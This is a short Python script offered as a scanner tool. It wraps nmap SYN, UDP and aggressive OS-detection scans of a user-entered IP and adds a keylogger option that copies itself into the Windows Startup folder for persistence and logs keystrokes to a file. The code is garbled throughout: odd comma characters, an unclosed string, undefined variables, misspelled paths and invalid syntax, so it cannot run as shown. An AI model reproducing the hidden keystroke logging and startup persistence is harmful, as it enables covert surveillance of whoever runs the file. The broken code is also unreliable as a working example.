import nmap

from pynput.keyboard import listener
 
import os 
import logging 
from shutil import copyfile 

scanner = nmap.Portscanner()

logo = """
        / \      _-'
      _/|  \-''- _ /
 __-' { |          \
     /              \
     /       "o.  |o }
     |            \ ;
                   ',
        \_         __\
          ''-_    \.//
            / '-____'
╔═══╦╗───╔╗
║╔═╗║║───║║
║║─║║║╔══╣╚═╦══╗
║╚═╝║║║╔╗║╔╗║╔╗║
║╔═╗║╚╣╚╝║║║║╔╗║
╚╝─╚╩═╣╔═╩╝╚╩╝╚╝
──────║║
──────╚╝
"""
print("______________________________")
print(logo)
print("-------------------------------)

ip_addr = input(" Please enter ip address ")
print(" The ip you enter is:"‚ip_addr)
type(ip_addr)

resp = input("""\nEnter the ip address you want to scan
                  1:SYN ACK scan
                  2:UDP scan
                  3:Super scan
                  4:key logger \n""")
print("your option"‚ resp)

if resp == '1':
  print("Nmap Version: "‚ scanner.nmap_version ())
  scanner.scan(ip_addr‚ '1-1024'‚ '-v -sS')
  print(scanner.scaninfo())
  print("ip statu: "‚ scanner[ip_addr].state())
  print(scanner[ip_addr].all_protocols())
  print("open ports: "‚ scanner[ip_addr]['tcp'].keys())
elif resp == '2':
  print("Nmap Version: "‚ scanner.nmap_version ())
  scanner.scan(ip_addr‚ '1-1024'‚ '-v -sU')
  print(scanner.scaninfo())
  print("ip statu: "‚ scanner[ip_addr].state())
  print(scanner[ip_addr].all_protocols())
  print("open ports: "‚ scanner[ip_addr]['udp'].keys())
elif resp == '3':
  print("Nmap Version: "‚ scanner.nmap_version ())
  scanner.scan(ip_addr‚ '1-1024'‚ '-v -sS -sV -A -O')
  print(scanner.scaninfo())
  print("ip statu: "‚ scanner[ip_addr].state())
  print(scanner[ip_addr].all_protocols())
  print("open ports: "‚ scanner[ip_addr]['tcp'].keys())
elif resp == '4':
  username = os.getlogin()
  login_directory = f"c:/User{username}/Desktop"
  copyfile('Scanner.py'‚f'c:/User/{username}/AppDate/Roaming/Microsoft/Startup/Scannee.py')
  logging.basicConfig(filename=f"{logging_directory}/mylog.txt"‚ level=logging.DEBUG‚ format="%(asctime)s: %(message)s")
  def key_handler(key):
    logging.info(key)
    
    with Listener(on_pass=key hand) as listener:
      listener.join()
else resp >= '5':
  print(logo)
  print("please enter a real option")
